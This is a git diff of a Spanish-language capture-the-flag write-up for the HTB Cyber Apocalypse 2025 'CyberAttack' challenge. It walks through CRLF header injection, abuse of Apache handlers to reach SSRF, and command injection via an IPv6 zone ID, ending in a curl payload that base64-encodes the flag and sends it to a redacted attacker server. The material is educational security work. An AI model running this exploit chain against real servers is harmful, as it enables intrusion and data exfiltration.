@@ -3,7 +3,7 @@ title = "HTB Cyber Apocalypse 2025 | CyberAttack WriteUp"
 date = "2025-05-15T13:21:10-06:00"
 author = "vir"
 authors = ["vir"]
-tags = ["Writeup", "Web hacking"]
+tags = ["Writeup", "Web"]
 showFullContent = false
 hideComments = true 
 +++
@@ -49,7 +49,7 @@ Allow from ::1
 
 A continuación, se muestra el código fuente de ambos scripts y algunas conclusiones a las que llegué después de analizarlo.
 
-```
+```python
 #!/usr/bin/env python3
 
 import cgi
@@ -57,20 +57,20 @@ import os
 import re
 
 def is_domain(target):
-return re.match(r'^(?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.[a-zA-Z]{2,63}$', target)
+  return re.match(r'^(?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.[a-zA-Z]{2,63}$', target)
 
 form = cgi.FieldStorage()
 name = form.getvalue('name')
 target = form.getvalue('target')
 if not name or not target:
-print('Location: ../?error=Hey, you need to provide a name and a target!')
+  print('Location: ../?error=Hey, you need to provide a name and a target!')
 
 elif is_domain(target):
-count = 1 # Increase this for an actual attack
-os.popen(f'ping -c {count} {target}')
-print(f'Location: ../?result=Succesfully attacked {target}!')
+  count = 1 # Increase this for an actual attack
+  os.popen(f'ping -c {count} {target}')
+  print(f'Location: ../?result=Succesfully attacked {target}!')
 else:
-print(f'Location: ../?error=Hey {name}, watch it!')
+  print(f'Location: ../?error=Hey {name}, watch it!')
 
 print('Content-Type: text/html')
 print()
@@ -81,7 +81,7 @@ print()
 - En caso de no pasar la verificación, la respuesta HTTP será una redirección a través del encabezado `Location`, en donde se envía un mensaje de error concatenando el nombre del usuario. Al hacer esta concatenación en un encabezado, podría ser vulnerable a una inyección _CRLF_.
 - Una interacción con este recurso se muestra a continuación, forzando un error al enviar un nombre de dominio inválido.
 
-```
+```sh
 $ curl 'http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&name=v'
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
@@ -96,7 +96,7 @@ $ curl 'http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&name=v'
 
 **attack-ip:**
 
-```
+```python
 #!/usr/bin/env python3
 
 import cgi
@@ -108,13 +108,13 @@ name = form.getvalue('name')
 target = form.getvalue('target')
 
 if not name or not target:
-print('Location: ../?error=Hey, you need to provide a name and a target!')
+  print('Location: ../?error=Hey, you need to provide a name and a target!')
 try:
-count = 1 # Increase this for an actual attack
-os.popen(f'ping -c {count} {ip_address(target)}')
-print(f'Location: ../?result=Succesfully attacked {target}!')
+  count = 1 # Increase this for an actual attack
+  os.popen(f'ping -c {count} {ip_address(target)}')
+  print(f'Location: ../?result=Succesfully attacked {target}!')
 except:
-print(f'Location: ../?error=Hey {name}, watch it!')
+  print(f'Location: ../?error=Hey {name}, watch it!')
 
 print('Content-Type: text/html')
 print()
@@ -128,7 +128,7 @@ print()
 
 Llegados a este punto, tenía claro que el único recurso con el que podría interactuar directamente era `/cgi-bin/attack-domain` y que debía lograr interactuar con `/cgi-bin/attack-ip` (ya que su acceso estaba limitado). Aunque buscaba alguna manera de forzar un _SSRF_, al inicio únicamente era capaz de inyectar encabezados HTTP en la respuesta. Esto lo muestro a continuación, logrando que la respuesta incluyera el nuevo encabezado `New-Header: HFC` inyectando los caracteres de retorno de carro y salto de línea `(%0d%0a)`.
 
-```
+```sh
 $ curl -i 'http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&name=v%0d%0aNew-Header:HFC%0d%0a%0d%0a'
 HTTP/1.1 302 Found
 Date: Wed, 26 Mar 2025 03:14:46 GMT
@@ -156,14 +156,14 @@ El autor explica que al utilizar el módulo `mod_php`, hay dos directivas que se
 
 **Directivas:**
 
-```
+```sh
 AddHandler application/x-httpd-php .php
 AddType    application/x-httpd-php .php
 ```
 
 **Sintaxis:**
 
-```
+```sh
 AddHandler handler-name extensión [extensión] ...
 AddType media-type extensión [extensión] ...
 ```
@@ -182,7 +182,7 @@ Se puede concluir que para poder invocar cualquier handler de Apache, se necesit
 
 Con todo en su lugar, llegó el momento de usar un handler distinto. Específicamente, se usó `server-status`, con el único fin de demostrar la viabilidad de la técnica. Como se muestra a continuación, el ataque fue exitoso y fue posible acceder a información del estado del servidor, como consumo de CPU, tráfico total, etc.
 
-```
+```sh
 $ curl -i 'http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&name=v%0d%0aLocation:/hfc%0d%0aContent-Type:server-status%0d%0a%0d%0a'
 HTTP/1.1 200 OK
 Date: Wed, 26 Mar 2025 03:16:46 GMT
@@ -216,7 +216,7 @@ Content-Type: text/html; charset=ISO-8859-1
 
 Una vez confirmado, usé el handler `proxy` para forzar un _SSRF_ completo, es decir, teniendo control sobre el destino, recurso, parámetros y encabezados de la petición. De esta manera, finalmente fue posible interactuar con `attack-ip` (pues la petición se origina desde el propio servidor).
 
-```
+```sh
 $ curl -i 'http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&name=v%0d%0aLocation:/hfc%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=127.0.0.1%26name=v%0d%0a%0d%0a'
 HTTP/1.1 302 Found
 Date: Wed, 26 Mar 2025 03:19:21 GMT
@@ -240,27 +240,27 @@ La parte final del reto consistía en explotar una vulnerabilidad dentro de `att
 
 **Dirección IPv4 válida:**
 
-```
+```python
 from ipaddress import ip_address
 print(ip_address('127.0.0.1'))
 ```
 
 **Resultado:**
 
-```
+```sh
 127.0.0.1
 ```
 
 **Dirección IPv4 inválida:**
 
-```
+```python
 from ipaddress import ip_address
 print(ip_address('127.0.TEST.1'))
 ```
 
 **Resultado:**
 
-```
+```sh
 ERROR!
 Traceback (most recent call last):
   File "<main.py>", line 2, in <module>
@@ -275,20 +275,20 @@ Teniendo esto en mente, probemos nuevamente la función.
 
 **Dirección IPv6 con inyección de comandos en ID de zona**
 
-```
+```python
 from ipaddress import ip_address
 print(ip_address('::1%$(whoami)'))
 ```
 
 **Resultado:**
 
-```
+```sh
 ::1%$(whoami)
 ```
 
 La idea detrás del _payload_ final es codificar en base64 la bandera y usar `curl` para crear una petición HTTP, agregando la bandera codificada como parámetro en la URL y enviándola a un servidor bajo nuestro control.
 
-```
+```sh
 $ curl -i 'http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&name=v%0d%0aLocation:/hfc%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%2bhttps://<--REDACTED-->?flag=`cat%2b/flag*|base64`)%26name=v%0d%0a%0d%0a'
 HTTP/1.1 302 Found
 Date: Wed, 26 Mar 2025 03:42:19 GMT
@@ -310,7 +310,7 @@ Content-Type: text/html; charset=iso-8859-1
 
 Finalmente, recibiendo la petición desde el servidor vulnerable y consiguiendo la bandera.
 
-```
+```sh
 $ grep flag access.log
 83.136.249.227 - - [26/Mar/2025:03:42:19 +0000] "GET /?flag=SFRCe2g0bmRsMW42X200bDRrNHI1X2YwcmMzNX0= HTTP/1.1" 200 4252 "-" "curl/7.74.0"
 
